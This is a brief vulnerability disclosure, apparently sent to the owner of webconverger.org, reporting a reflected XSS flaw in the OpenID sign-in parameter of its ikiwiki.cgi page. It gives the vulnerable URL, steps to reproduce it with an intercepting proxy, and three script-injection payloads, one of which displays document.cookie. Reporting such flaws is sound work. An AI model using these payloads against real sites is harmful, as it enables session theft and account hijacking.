Respected Sir,
Your website "webconverger.org" is vulnerable to XSS Attack.

Vulnerable Links:
webconverger.org/ikiwiki.cgi?action=verify&do=signin&openid_identifier=1

How To Reproduce The Vulnerability :

1. Go to this link : webconverger.org/ikiwiki.cgi?action=verify&do=signin&openid_identifier=1
2. refresh the page and intercept the http request using "brup suite" then at parameter "openid_identifier=" put xss payload
3. forward the request

XSS Payload :

1. `"></script><script>prompt(909043)</script>`
2. `"></script><script>prompt("XSS Alert...!!! : Hacked By Raghav Bisht")</script>`
3. `"></script><script>prompt(document.cookie)</script>`

NOTE : Proof of concept is attached.


Thank You...!!
